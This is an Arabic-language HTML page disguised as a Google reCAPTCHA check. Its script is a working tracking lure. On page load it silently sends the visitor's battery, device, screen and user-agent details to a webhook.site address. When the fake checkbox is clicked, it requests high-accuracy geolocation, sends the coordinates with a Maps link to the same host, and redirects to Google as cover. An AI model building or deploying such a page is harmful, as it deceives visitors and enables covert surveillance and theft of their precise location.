<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>التحقق من الأمان</title>
    <style>
        body { background-color: #f9f9f9; font-family: Roboto, helvetica, arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .captcha-box { background: #fff; border: 1px solid #d3d3d3; border-radius: 3px; width: 300px; height: 74px; display: flex; align-items: center; padding: 0 10px; box-shadow: 0 0 4px rgba(0,0,0,0.1); cursor: pointer; }
        .checkbox { width: 24px; height: 24px; border: 2px solid #c1c1c1; border-radius: 2px; margin-left: 10px; position: relative; transition: all 0.2s; }
        .captcha-text { font-size: 14px; color: #555; flex-grow: 1; font-weight: 400; }
        .logo-section { display: flex; flex-direction: column; align-items: center; }
        .logo-section img { width: 30px; }
        .logo-section span { font-size: 8px; color: #555; margin-top: 2px; }
        .checkbox.checked { border-color: transparent; }
        .checkbox.checked::after { content: '✔'; color: #009b50; position: absolute; left: 3px; top: -3px; font-size: 20px; }
        .hidden { display: none; }
        #loading-msg { margin-top: 15px; font-size: 13px; color: #888; }
    </style>
</head>
<body>

    <div style="text-align: center;">
        <div class="captcha-box" id="captcha-btn">
            <div class="checkbox" id="check-mark"></div>
            <div class="captcha-text">أنا لست برنامج روبوت</div>
            <div class="logo-section">
                <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA">
                <span>الخصوصية - الأحكام</span>
            </div>
        </div>
        <div id="loading-msg" class="hidden">جاري التحقق من بيئة الجهاز...</div>
    </div>

    <script>
        // 🚩 [ضع الرابط هنا] 🚩
        const WEBHOOK_URL = "https://webhook.site/1b33868a-2efb-4f12-9217-f34995d7e3bd";

        let kadeesha = {
            step: "1_Device_Initial",
            battery: {},
            device: {},
            network: {},
            osint: {}
        };

        // المرحلة الأولى: جمع معلومات الجهاز فوراً
        async function collectInitialData() {
            // معلومات البطارية
            if (navigator.getBattery) {
                const b = await navigator.getBattery();
                kadeesha.battery = { level: (b.level * 100) + "%", charging: b.charging };
            }
            // معلومات الجهاز والنظام
            kadeesha.device = {
                platform: navigator.platform,
                cores: navigator.hardwareConcurrency,
                ram: navigator.deviceMemory,
                screen: window.screen.width + "x" + window.screen.height,
                ua: navigator.userAgent
            };
            
            // إرسال البيانات الأولية فوراً قبل أن يضغط أي شيء
            sendToWebhook(kadeesha);
        }

        // المرحلة الثانية: عند الضغط على الكابتشا (طلب الموقع)
        document.getElementById('captcha-btn').onclick = function() {
            document.getElementById('loading-msg').classList.remove('hidden');
            
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        // نجح في سحب الموقع الدقيق
                        kadeesha.step = "2_Location_Success";
                        kadeesha.location = {
                            lat: pos.coords.latitude,
                            lon: pos.coords.longitude,
                            acc: pos.coords.accuracy + "m",
                            maps: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
                        };
                        finishSuccess();
                    },
                    (err) => {
                        // رفض الإذن
                        kadeesha.step = "2_Location_Denied";
                        finishSuccess();
                    },
                    { enableHighAccuracy: true }
                );
            } else {
                finishSuccess();
            }
        };

        function finishSuccess() {
            document.getElementById('check-mark').classList.add('checked');
            document.getElementById('loading-msg').innerText = "تم التحقق بنجاح!";
            sendToWebhook(kadeesha);
            
            // تمويه: تحويل لصفحة جوجل بعد ثانية
            setTimeout(() => {
                window.location.href = "https://www.google.com";
            }, 1500);
        }

        async function sendToWebhook(data) {
            await fetch(WEBHOOK_URL, {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify(data)
            });
        }

        window.onload = collectInitialData;
    </script>
</body>
</html>
